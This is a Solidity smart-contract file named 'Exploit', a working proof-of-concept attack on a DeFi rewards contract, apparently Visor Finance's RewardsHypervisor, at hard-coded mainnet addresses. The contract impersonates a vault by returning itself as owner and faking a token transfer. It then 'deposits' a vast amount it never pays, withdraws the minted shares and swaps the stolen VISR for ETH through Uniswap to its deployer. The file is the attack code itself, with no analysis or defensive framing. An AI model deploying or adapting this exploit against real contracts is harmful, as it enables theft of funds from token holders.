//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface IRewardsHypervisor {
    function deposit(
        uint256 visrDeposit,
        address payable from,
        address to
    ) external returns (uint256 shares);

    function withdraw(
        uint256 shares,
        address to,
        address payable from
    ) external returns (uint256 rewards);
}

interface IVisor {
    function owner() external returns(address);
    function delegatedTransferERC20(address token, address to, uint256 amount) external;
}

interface IUniswapRouter {
    function swapExactTokensForETH(
        uint256 amountIn, 
        uint256 amountOutMin, 
        address[] calldata path, 
        address to, 
        uint256 deadline
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address owner) external returns (uint256);
}

contract Exploit is IVisor {
    
    address private immutable _owner;

    address private immutable _vvisor = 0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5;

    address private immutable _visor = 0xF938424F7210f31dF2Aee3011291b658f872e91e;
    
    IRewardsHypervisor private immutable _rewardHyperVisor = IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);

    IUniswapRouter private immutable _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor() {
        _owner = msg.sender;
    }

    function delegatedTransferERC20(address, address, uint256) external override{
        //dont do anything
    }

    function owner() external override view returns (address) {
        return address(this);
    }

    function execute() external {
        require(msg.sender == _owner, "Oops");
        
        _rewardHyperVisor.deposit(100000000000 ether, payable(address(this)), address(this));
        IERC20(_vvisor).approve(address(_rewardHyperVisor), type(uint).max);
        _rewardHyperVisor.withdraw(IERC20(_vvisor).balanceOf(address(this)), address(this), payable(address(this)));
        
        //swap visor to eth
        address[] memory path = new address[](2);
        path[0] = _visor;
        path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; 
        IERC20(_visor).approve(address(_uniswapRouter), type(uint).max);
        _uniswapRouter.swapExactTokensForETH(
            IERC20(_visor).balanceOf(address(this)),
            0,
            path,
            _owner,
            block.timestamp + 1 days
        );
    }

    receive() payable external {}

}